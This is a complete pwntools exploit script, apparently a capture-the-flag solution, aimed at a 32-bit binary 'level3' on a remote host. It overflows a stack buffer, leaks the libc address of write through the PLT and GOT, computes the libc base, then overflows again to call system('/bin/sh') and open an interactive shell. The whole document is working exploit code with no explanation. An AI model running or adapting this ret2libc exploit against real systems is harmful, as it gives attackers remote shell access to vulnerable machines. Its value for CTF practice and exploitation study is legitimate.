from pwn import *
p = process("./level3")
p=remote("111.198.29.45","32845")
e = ELF("./level3")
libc=ELF('./libc_32.so.6') # 
context.log_level = 'debug'
p.recv()
payload = 'a' * (0x88 + 4) + p32(e.plt['write']) + p32(0x0804844B) + p32(1)+p32(e.got['write'])+p32(4)
p.sendline(payload)
libc.address=u32(p.recv(4))-libc.symbols['write']
success(hex(libc.address))
payload='a'*(0x88+4)+p32(libc.symbols['system'])+p32(next(libc.search('/bin/sh')))*2
p.recvuntil(":")
p.sendline(payload)
p.interactive()